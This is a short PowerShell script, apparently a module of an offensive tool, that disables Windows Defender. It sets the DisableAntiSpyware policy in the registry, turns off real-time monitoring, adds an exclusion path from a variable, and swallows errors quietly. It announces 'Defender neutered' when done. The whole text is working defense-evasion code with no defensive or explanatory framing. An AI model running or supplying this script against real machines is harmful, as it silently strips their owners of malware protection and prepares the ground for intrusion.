script:
$sub = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
if (-not (Test-Path $sub)) { New-Item -Path $sub -Force | Out-Null }
Set-ItemProperty -Path $sub -Name DisableAntiSpyware -Value 1 -Type DWord
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Ignore } catch { }
if ($EXCLUSION_PATH) {
    try { Add-MpPreference -ExclusionPath $EXCLUSION_PATH -ErrorAction Ignore } catch { }
}
Write-Output 'Defender neutered'
